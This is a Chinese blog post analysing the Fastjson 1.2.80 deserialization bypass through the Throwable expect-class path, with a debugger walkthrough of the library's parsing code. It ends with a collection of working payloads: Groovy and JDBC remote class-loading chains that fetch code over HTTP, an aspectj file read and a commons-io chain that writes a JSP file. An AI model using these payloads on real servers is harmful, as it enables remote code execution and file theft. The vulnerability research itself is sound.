---
title: Fastjson1.2.80漏洞分析
date: 2026-11-18
---

# Fastjson1.2.80漏洞分析

## 1.2.68 的修复

之前在 Fastjson 1.2.68 中是通过`AutoCloseable`这个类来实现绕过的，所以针对这个绕过方法，Fastjson 在过滤的`expectClass`进行了修改，新增了三个类`java.lang.Runnable`、`java.lang.Readable`和`java.lang.AutoCloseable`，然后将原来的`Class`类型的判断修改为对 hash 的判断。

## 漏洞原理

原理还是基于 Fastjson 反序列化恢复类实例时，需要恢复用到的类属性，而`checkAutoType()`中期望类机制会在实例化类属性的对应类后将其加入到类缓存`mappings`中。如果这个属性是可利用的类且我们可控，可以直接利用或者进一步横向扩展出其他类间接利用。依靠属性名赋值时的隐式类间关系，不再需要在 JSON 中显式指定`@type`，从缓存中取类在修复前不会判断`autoTypeSupport`，从而绕过了`autoType`的白名单检查。

而 1.2.80 使用的是另一个期望类，即异常类`Throwable`。

## 漏洞复现

直接导入对应版本的 Fastjson 的依赖：

```xml
<dependencies>
	<dependency>
		<groupId>com.alibaba</groupId>
		<artifactId>fastjson</artifactId>
		<version>1.2.80</version>
	</dependency>
</dependencies>
```

先写一个继承了`Exception`的类：

```java
package com.solowalker.fastjson.poc;

import java.io.IOException;

public class Poc extends Exception{
    public void setName(String str) throws IOException {
        Runtime.getRuntime().exec(str);
    }
}
```

然后进行反序列化：

```java
package com.solowalker.fastjson.poc;

import com.alibaba.fastjson.JSON;

public class PocDemo {
    public static void main(String[] args) {
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.solowalker.fastjson.poc.Poc\",\"name\":\"calc\"}";
        JSON.parse(json);
    }
}
```

![屏幕截图 2026-11-18 220651](/images/screenshots/屏幕截图%202026-11-18%20220651.png)

成功弹出计算器。

## 调试分析

先在`parse()`这里打个断点，简单看一下反序列化的过程。

跟进到下图的方法：

![屏幕截图 2026-11-19 140543](/images/screenshots/屏幕截图%202026-11-19%20140543.png)

这里会创建一个`DefaultJSONParser`来解析我们的 JSON 字符串，然后调用`parse()`开始识别 JSON 结构，当这个方法遇到`{`的时候，知道要反序列化一个对象，然后进入`parseObject()`的逻辑。下面来看一下其中的代码实现。

跟进到下图的函数：

![屏幕截图 2026-11-19 141133](/images/screenshots/屏幕截图%202026-11-19%20141133.png)

这里看一下它的具体实现：

```java
public Object parse(Object fieldName) {
        final JSONLexer lexer = this.lexer;
        switch (lexer.token()) {
            case SET:
                lexer.nextToken();
                HashSet<Object> set = new HashSet<Object>();
                parseArray(set, fieldName);
                return set;
            case TREE_SET:
                lexer.nextToken();
                TreeSet<Object> treeSet = new TreeSet<Object>();
                parseArray(treeSet, fieldName);
                return treeSet;
            case LBRACKET:
                Collection array = isEnabled(Feature.UseNativeJavaObject)
                        ? new ArrayList()
                        : new JSONArray();
                parseArray(array, fieldName);
                if (lexer.isEnabled(Feature.UseObjectArray)) {
                    return array.toArray();
                }
                return array;
            case LBRACE:
                Map object = isEnabled(Feature.UseNativeJavaObject)
                    ? lexer.isEnabled(Feature.OrderedField)
                    ? new HashMap()
                    : new LinkedHashMap()
                    : new JSONObject(lexer.isEnabled(Feature.OrderedField));
                return parseObject(object, fieldName);
//            case LBRACE: {
//                Map<String, Object> map = lexer.isEnabled(Feature.OrderedField)
//                        ? new LinkedHashMap<String, Object>()
//                        : new HashMap<String, Object>();
//                Object obj = parseObject(map, fieldName);
//                if (obj != map) {
//                    return obj;
//                }
//                return new JSONObject(map);
//            }
            case LITERAL_INT:
                Number intValue = lexer.integerValue();
                lexer.nextToken();
                return intValue;
            case LITERAL_FLOAT:
                Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));
                lexer.nextToken();
                return value;
            case LITERAL_STRING:
                String stringLiteral = lexer.stringVal();
                lexer.nextToken(JSONToken.COMMA);

                if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) {
                    JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);
                    try {
                        if (iso8601Lexer.scanISO8601DateIfMatch()) {
                            return iso8601Lexer.getCalendar().getTime();
                        }
                    } finally {
                        iso8601Lexer.close();
                    }
                }

                return stringLiteral;
            case NULL:
                lexer.nextToken();
                return null;
            case UNDEFINED:
                lexer.nextToken();
                return null;
            case TRUE:
                lexer.nextToken();
                return Boolean.TRUE;
            case FALSE:
                lexer.nextToken();
                return Boolean.FALSE;
            case NEW:
                lexer.nextToken(JSONToken.IDENTIFIER);

                if (lexer.token() != JSONToken.IDENTIFIER) {
                    throw new JSONException("syntax error");
                }
                lexer.nextToken(JSONToken.LPAREN);

                accept(JSONToken.LPAREN);
                long time = lexer.integerValue().longValue();
                accept(JSONToken.LITERAL_INT);

                accept(JSONToken.RPAREN);

                return new Date(time);
            case EOF:
                if (lexer.isBlankInput()) {
                    return null;
                }
                throw new JSONException("unterminated json string, " + lexer.info());
            case HEX:
                byte[] bytes = lexer.bytesValue();
                lexer.nextToken();
                return bytes;
            case IDENTIFIER:
                String identifier = lexer.stringVal();
                if ("NaN".equals(identifier)) {
                    lexer.nextToken();
                    return null;
                }
                throw new JSONException("syntax error, " + lexer.info());
            case ERROR:
            default:
                throw new JSONException("syntax error, " + lexer.info());
        }
    }
```

`lexer.token()`是当前 JSON 词法单元的类型。由于我们构造的是`{`，所以`lexer.token()`就是`LBRACE`，然后进入`parseObject()`分支。

![屏幕截图 2026-11-19 141610](/images/screenshots/屏幕截图%202026-11-19%20141610.png)

这里先创建了一个容器对象，默认是`JSONObject`，然后调用`parseObject(object, fieldName)`，将我们传入的 JSON 内容给填充到这个`JSONObject`中。跟进到`parseObject()`中。

![屏幕截图 2026-11-19 145429](/images/screenshots/屏幕截图%202026-11-19%20145429.png)

一直走到这。payload 中第一个键就是`@type`。再往下到`clazz = config.checkAutoType(typeName, null, lexer.getFeatures());`这一行。

![屏幕截图 2026-11-19 145754](/images/screenshots/屏幕截图%202026-11-19%20145754.png)

这里第一次调用`checkAutoType()`，此时第二个参数是`null`，也就是`expectClass = null`。因为`java.lang.Exception`类事先被 Fastjson 保存到了缓存中，所以在处理这个类的时候直接设置`expectClass = null`。

![屏幕截图 2026-11-19 151043](/images/screenshots/屏幕截图%202026-11-19%20151043.png)

调试的时候也能发现，`java.lang.Exception`类是直接从缓存 mapping 中取出来的，然后直接返回这个类。返回到`parseObject()`这个方法中，再往下走，走到这里：

![屏幕截图 2026-11-19 151736](/images/screenshots/屏幕截图%202026-11-19%20151736.png)

这里获取对象反序列化器可以跟进去看一下，实际上就是经历了一系列判断，然后返回了一个`ThrowableDeserializer`对象。

![屏幕截图 2026-11-19 152502](/images/screenshots/屏幕截图%202026-11-19%20152502.png)

然后走到`Object obj = deserializer.deserialze(this, clazz, fieldName);`这里，跟进去。

![屏幕截图 2026-11-19 153405](/images/screenshots/屏幕截图%202026-11-19%20153405.png)

首先确定了当前处理的是一个`Throwable`类型，然后开始第二次`checkAytoType()`。

![屏幕截图 2026-11-19 153725](/images/screenshots/屏幕截图%202026-11-19%20153725.png)

这里拿到的`key`其实是 payload 中的第二个`@type`，指向了我们的 POC。然后提取 payload 中的类名，进入`checkAutoType()`，而此时`checkAutoType()`的第二个参数是`Throwable.class`。然后对`expectClass`这个参数也就是我们传入的`Throwable.class`计算哈希，而`Throwable.class`不在黑名单中，所以会设置`expectClassFlag`为`true`，这样才能后续走到`loadClass`来加载我的恶意类。

![屏幕截图 2026-11-19 155124](/images/screenshots/屏幕截图%202026-11-19%20155124.png)

一直到这里才开始加载我们的恶意类：

![屏幕截图 2026-11-19 160804](/images/screenshots/屏幕截图%202026-11-19%20160804.png)

这里其实由于`expectClassFlag`为`true`，所以已经可以加载我们的恶意类了。然后跟进到`loadClass()`里看一下。

![屏幕截图 2026-11-19 161421](/images/screenshots/屏幕截图%202026-11-19%20161421.png)

一直到这里，我们的恶意类被加载。类被加载后会被放到 Fastjson 全局缓存的地方。然后回到`ThrowableDeserializer`类中。一直走到这里才会调用我们的恶意`setter`：

![屏幕截图 2026-11-19 162345](/images/screenshots/屏幕截图%202026-11-19%20162345.png)

通过调试时边上的变量的值我们就可以发现，这里成功执行了恶意`setter`，把`calc`命令注入进去。

至此，整个绕过流程已经分析完毕。

## POC

由于 Fastjson 高版本想要实现 RCE 基本都需要利用第三方依赖才能实现，所以利用条件相对苛刻，但是在 SRC 挖掘中不需要实现 RCE，只要能够证明漏洞存在即可，所以这一类的 POC 比较容易利用，比如利用 Fastjson 本身的异常类：

```json
{
    "@type":"java.lang.Exception",
    "@type":"com.alibaba.fastjson.JSONException",
    "x":{
        "@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}
	}
}

{"a":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}},"b":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}}
```

想要实现 RCE，一般会用到以下几种：

- `Groovy`实现 RCE

```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}

{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
     "@type":"org.codehaus.groovy.control.CompilerConfiguration",
     "classpathList":"http://127.0.0.1:9999/"
    }
}
```

这个 POC 需要服务端有`groovy-all`这样的`Groovy`库。整体的攻击思路就是：第一阶段进行缓存投毒，通过`unit`字段来实现`TypeUtils.cast`，在转换过程中调用`getDeserializer(ProcessingUnit.class)`，从而创建出`ProcessingUnit`的反序列化器并放入`deserializer`缓存；第二阶段通过第一步的投毒来触发远程类加载，通过`JavaStubCompilationUnit`的构造函数接收`config`参数来实现攻击。

这种攻击方式的具体实现可以参考这篇文章：[Fastjson1.2.80反序列化漏洞分析与利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/354868.html)

还有一些其他的 payload：

`JDBC`连接 RCE：依赖于`jython + psql + spring-context`。

```json
{
    "a":{
    "@type":"java.lang.Exception",
    "@type":"org.python.antlr.ParseException",
    "type":{}
    },
    "b":{
        "@type":"org.python.core.PyObject",
        "@type":"com.ziclix.python.sql.PyConnection",
        "connection":{
            "@type":"org.postgresql.jdbc.PgConnection",
            "hostSpecs":[
                {
                    "host":"127.0.0.1",
                    "port":2333
                }
            ],
            "user":"user",
            "database":"test",
            "info":{
                "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketFactoryArg":"http://127.0.0.1:8090/exp.xml"
            },
            "url":""
        }
    }
}

```

加载的`exp.xml`：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder">
  <constructor-arg>
    <list value-type="java.lang.String" >
       <value>cmd</value>
       <value>/c</value>
       <value>calc</value>
    </list>
  </constructor-arg>
  <property name="whatever" value="#{pb.start()}"/>
</bean>
</beans>

```

`aspectj`任意文件读取：

```json
//第一次
{
   "@type":"java.lang.Exception",
   "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}


//第二次
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
}
//第三次，针对Windows系统
   {
      "x":{
         "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
         "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
         "fileName":"c:\\windows\win.ini"
      }
   }
//另一种姿势，报错回显
{
    "@type":"java.lang.Character"
    {
        "c":{
            "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
            "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
            "fileName":"c:/windows/win.ini"
    }
}
//第三次2 报错回显

```

`commons-io`写入文件：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import jdk.nashorn.internal.parser.JSONParser;


public class demo {
    public static void main(String[] args) {
        String code = "test";
        for (int i = 0; i < 8200; i++) {
            code += "a";
        }
        String poc2 = "    \r\n"
                + "    {\r\n"
                + "  \"su14\": {\r\n"
                + "    \"@type\": \"java.lang.Exception\",\r\n"
                + "    \"@type\": \"ognl.OgnlException\"\r\n"
                + "  },\r\n"
                + "  \"su15\": {\r\n"
                + "    \"@type\": \"java.lang.Class\",\r\n"
                + "    \"val\": {\r\n"
                + "      \"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "      {\r\n"
                + "        \"@type\": \"java.lang.String\"\r\n"
                + "        \"@type\": \"ognl.OgnlException\",\r\n"
                + "        \"_evaluation\": \"\"\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su16\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "      \"reader\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\r\n"
                + "        \"charSequence\":{\"@type\":\"java.lang.String\"\""+code+"\"\r\n"
                + "      },\r\n"
                + "      \"charsetName\":\"UTF-8\",\r\n"
                + "      \"bufferSize\":1024\r\n"
                + "    },\r\n"
                + "            \"branch\":{\r\n"
                + "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\r\n"
                + "      \"writer\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\r\n"
                + "        \"file\":\"1.jsp\",\r\n"
                + "        \"encoding\":\"UTF-8\",\r\n"
                + "        \"append\": false\r\n"
                + "      },\r\n"
                + "      \"charsetName\":\"UTF-8\",\r\n"
                + "      \"bufferSize\": 1024,\r\n"
                + "      \"writeImmediately\": true\r\n"
                + "    },\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su17\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su18\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },\r\n"
                + "    \"su19\": {\r\n"
                + "      \"@type\": \"ognl.Evaluation\",\r\n"
                + "      \"node\": {\r\n"
                + "        \"@type\": \"ognl.ASTMethod\",\r\n"
                + "        \"p\": {\r\n"
                + "          \"@type\": \"ognl.OgnlParser\",\r\n"
                + "          \"stream\": {\r\n"
                + "            \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "            \"delegate\": {\r\n"
                + "              \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "              \"reader\": {\r\n"
                + "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\r\n"
                + "      \"is\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\r\n"
                + "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\r\n"
                + "        \"closeBranch\": true\r\n"
                + "      },\r\n"
                + "      \"httpContentType\":\"text/xml\",\r\n"
                + "      \"lenient\":false,\r\n"
                + "      \"defaultEncoding\":\"UTF-8\"\r\n"
                + "    },\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bufferSize\": 1024\r\n"
                + "            },\r\n"
                + "            \"boms\": [{\r\n"
                + "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "              \"charsetName\": \"UTF-8\",\r\n"
                + "              \"bytes\": [\r\n"
                + "                36,82\r\n"
                + "              ]\r\n"
                + "            }]\r\n"
                + "          }\r\n"
                + "        }\r\n"
                + "      }\r\n"
                + "    },  \r\n"
                + "  }\r\n"
                + "";
        System.out.println(poc2);

        JSON.parseObject(poc2);
    }
}

```

## 总结

核心的绕过和之前的版本感觉差别不大，自己调试一遍会更好的理解。





















